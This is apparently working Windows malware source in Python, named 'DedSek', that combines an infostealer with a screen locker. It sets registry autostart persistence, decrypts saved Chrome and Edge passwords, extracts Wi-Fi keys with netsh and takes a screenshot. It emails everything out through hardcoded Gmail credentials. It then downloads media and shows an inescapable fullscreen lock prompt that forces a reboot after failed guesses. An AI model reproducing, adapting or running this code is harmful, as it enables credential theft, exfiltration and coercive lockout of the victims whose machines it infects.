import ctypes, os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import shutil, winshell, base64, random, socket, subprocess, json
import urllib.request, urllib.parse, smtplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab, Image, ImageDraw
import sqlite3, winreg, zipfile, win32crypt, re, wave
from win32com.client import Dispatch

PASSWORD = "1601"
MAX_ATTEMPTS = 4
SKULL_BASE64 = "YOUR_BASE64_HERE"
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
attempts_left = MAX_ATTEMPTS

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DedSek", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
    except: pass

def download_video():
    try:
        if os.path.exists(VIDEO_PATH): os.remove(VIDEO_PATH)
        urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
    except: pass

def download_audio():
    try:
        if os.path.exists(AUDIO_PATH): os.remove(AUDIO_PATH)
        urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
    except: pass

def play_video():
    try:
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            v = tk.Tk()
            v.attributes('-fullscreen', True)
            v.attributes('-topmost', True)
            v.configure(bg='black')
            v.overrideredirect(True)
            v.protocol("WM_DELETE_WINDOW", lambda: None)
            
            lbl = tk.Label(v, bg='black')
            lbl.pack(expand=True, fill='both')
            
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(AUDIO_PATH)
                pygame.mixer.music.play()
            except: pass
            
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                frame = cv2.resize(frame, (v.winfo_screenwidth(), v.winfo_screenheight()))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img)
                lbl.image = img
                v.update()
                time.sleep(1/fps)
            
            cap.release()
            try: pygame.mixer.music.stop()
            except: pass
            v.destroy()
    except: pass

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp): continue
        try:
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n"+ "-"*40)
                except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    return res

def steal_wifi():
    r = []
    try:
        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    key = "НЕТ"
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
                    r.append(f"WiFi: {p} | Пароль: {key}")
    except: pass
    return r

def mega_steal():
    report = ["="*60, "DEDSEK STEALER", "="*60]
    report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    for name, paths in {"CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
                        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')]}.items():
        data = steal_chromium(name, paths)
        if data: report.append(f"\n{name}:"); report.extend(data)
    report.append("\nWIFI:"); report.extend(steal_wifi() or ["No data"])
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        try: send_email(part, f"[DedSek_Logs] [{i+1}]")
        except: pass
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        try: send_file_email(ss, "[DedSek_Logs] Screenshot")
        except: pass
        try: os.remove(ss)
        except: pass
    except: pass

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def reset_windows():
    try: os.system("shutdown /r /t 0 /f"); os._exit(0)
    except: os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f: f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except: pass
        
        msg = f"""Ну привет друг, как у тебя дела?

Да, понимаю, ты попался.
Ну и нахуя ты скачал игру из инета?
Я не пойму...

Ну ладно, вот тебе загадка. Там пароль.

Я — год, когда произошло событие,
которое не произошло.
В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.
Но в Windows я стал началом времён.
Потому что я — первый год,
который существует в этом мире,
но не существовал в реальности.

ЧТО Я ЗА ЧИСЛО?

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
        
        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            self.sl.config(text="ВЕРНО!", fg='white')
            self.win.update()
            time.sleep(1)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                self.sl.config(text="404 | ОШИБКА", fg='white')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                reset_windows()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    print("STARTING...")
    
    # Автозагрузка
    try: add_to_startup()
    except: pass
    
    # Стилер в фоне
    threading.Thread(target=mega_steal, daemon=True).start()
    
    # Видео
    try:
        download_video()
        download_audio()
        time.sleep(1)
        play_video()
    except: pass
    
    # Винлокер
    print("SHOWING LOCKER...")
    WinLocker()
    tk.mainloop()
